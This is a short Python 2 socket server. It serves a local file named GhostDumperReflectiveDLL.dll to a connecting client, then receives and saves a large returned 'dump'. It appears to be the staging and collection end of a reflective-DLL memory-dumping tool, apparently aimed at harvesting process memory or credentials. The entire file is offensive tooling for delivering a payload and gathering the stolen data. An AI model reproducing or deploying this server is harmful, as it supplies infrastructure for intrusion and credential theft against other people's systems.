import socket
import os

HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 8080        # Port to listen on (non-privileged ports are > 1023)
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(5)
    conn, addr = s.accept()
    print('Connected by', addr)
    #data = conn.recv(1024)
    dllPath = r"C:\Users\axe\git_projects\GhostDumper\GhostDumper\GhostDumperReflectiveDLL\x64\Debug\GhostDumperReflectiveDLL.dll"
    size = os.path.getsize(dllPath)
    print size
    conn.send(str(size))
    file = open(dllPath,"rb")
    chunk = file.read(size)
    print len(chunk)
    conn.send(chunk)

    dump = open("dump","wb")


    dump.write(conn.recv(200000000))

    dump.close()
    s.close()
